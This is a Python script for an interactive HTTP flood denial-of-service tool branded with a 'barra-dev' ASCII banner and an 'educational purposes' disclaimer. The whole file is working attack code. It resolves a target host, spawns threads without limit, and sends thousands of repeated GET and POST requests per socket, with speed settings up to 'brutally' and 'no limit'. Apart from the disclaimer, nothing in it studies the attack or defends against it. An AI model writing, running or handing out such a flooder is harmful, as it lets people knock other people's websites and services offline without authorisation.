import socket
import threading
import string
import random
import platform
import time
import os
import requests
from colorama import Fore, init

init()

def cls():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

cls()

ascii_art = """
                                                                                          
                            _                                                 _        
                            ( )                                               ( )       
                            | |_      _ _  _ __  _ __   _ _    ___  _   _    _| |   _ _ 
                            | '_`\  /'_` )( '__)( '__)/'_` ) /'___)( ) ( ) /'_` | /'_` )
                            | |_) )( (_| || |   | |  ( (_| |( (___ | (_) |( (_| |( (_| |
                            (_,__/'`\__,_)(_)   (_)  `\__,_)`\____)`\___/'`\__,_)`\__,_)
                                                                                        
                                                           
                                                                            
~ Tool created by barra-dev.
~ This tool was created for educational purposes. I am not responsible for your use of this tool.  

-----------------------------------------------------------------------------------------------------

"""

color_range = [Fore.BLUE, Fore.LIGHTBLUE_EX, Fore.WHITE, Fore.LIGHTBLACK_EX]
gradient_art = ""

for line in ascii_art.splitlines():
    for i, char in enumerate(line):
        color = color_range[i % len(color_range)]
        gradient_art += f"{color}{char}"
    gradient_art += "\n"

print(gradient_art)

class DDosTool:
    def __init__(self):
        self.status_code = False

    def start_attack(self, target_url, target_port, speed):
        if not self.status_code:
            self.status_code = True
            target_ip = self.get_target_ip(target_url)
            if target_ip:
                threading.Thread(target=self.run_attack, args=(target_ip, target_port, speed)).start()

    def stop_attack(self):
        self.status_code = False

    def run_attack(self, target_ip, target_port, speed):
        spam_loader = 5  
        create_thread = 5  
        booter_sent = 5000  
        while self.status_code:
            for i in range(create_thread):  
                threading.Thread(target=self.http_attack, args=(target_ip, target_port, booter_sent, i)).start()
                if speed != "no limit":
                    time.sleep(self.get_speed(speed))

    def get_target_ip(self, target_url):
        try:
            host = str(target_url).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
            return socket.gethostbyname(host)
        except socket.gaierror:
            return ""

    def status_print(self, ip):
        print(f"{Fore.LIGHTBLUE_EX}Flooding {Fore.BLUE}Target{Fore.WHITE}={ip}{Fore.RESET}")

    def generate_url_path_pyflooder(self, num):
        msg = str(string.ascii_letters + string.digits + string.punctuation)
        data = "".join(random.sample(msg, int(num)))
        return data

    def generate_url_path_choice(self, num):
        letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_{|}~'''
        data = ""
        for _ in range(int(num)):
            data += random.choice(letter)
        return data

    def http_attack(self, target_ip, target_port, booter_sent, thread_num):
        rps = 0
        url_path = ''
        path_get = ['PY_FLOOD', 'CHOICES_FLOOD']
        path_get_loader = random.choice(path_get)
        if path_get_loader == "PY_FLOOD":
            url_path = self.generate_url_path_pyflooder(5)
            http_method = "GET"
        else:
            url_path = self.generate_url_path_choice(5)
            http_method = "POST"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            if http_method == "GET":
                request_line = f"GET /{url_path} HTTP/1.1\r\n"
            elif http_method == "POST":
                request_line = f"POST / HTTP/1.1\r\n"
            packet_data = f"{request_line}Host: {target_ip}\r\n\r\n".encode()
            s.connect((target_ip, target_port))
            for _ in range(booter_sent):
                s.sendall(packet_data)
                rps += 2
            print(f"{Fore.LIGHTBLUE_EX}http {Fore.WHITE}brutalization{Fore.LIGHTBLACK_EX} of {Fore.BLUE}-----> {Fore.LIGHTBLUE_EX}{target_ip}{Fore.WHITE}:{Fore.LIGHTBLACK_EX}{target_port}{Fore.BLUE} using{Fore.WHITE} {http_method} {Fore.LIGHTBLACK_EX}method.")  
        except Exception as e:
            pass
        finally:
            s.close()

    def get_speed(self, speed):
        speed_map = {
            'slow': 0.5,
            'medium': 0.3,
            'fast': 0.1,
            'very-fast': 0.05,
            'brutally': 0.01
        }
        return speed_map.get(speed, 0)

    def check_status(self, target_url):
        if target_url:
            try:
                response = requests.get(target_url, timeout=5)
                if response.status_code == 200:
                    print("Status: Online")
                else:
                    print(f"Status: Error {response.status_code}")
            except requests.RequestException:
                print("Status: Offline")
        else:
            print("Status: Unknown")

def main():
    tool = DDosTool()

    target_url = input("Enter Target URL: ")
    target_port = int(input("Enter Target Port: "))
    speed = input("Enter Attack Speed (slow, medium, fast, very-fast, brutally, no limit): ").lower()

    tool.check_status(target_url)
    
    start = input("Do you want to start the attack? (y/n): ").lower()
    if start == 'y':
        tool.start_attack(target_url, target_port, speed)
        input("""Press Enter to stop the attack...
        """)
        tool.stop_attack()

if __name__ == "__main__":
    main()
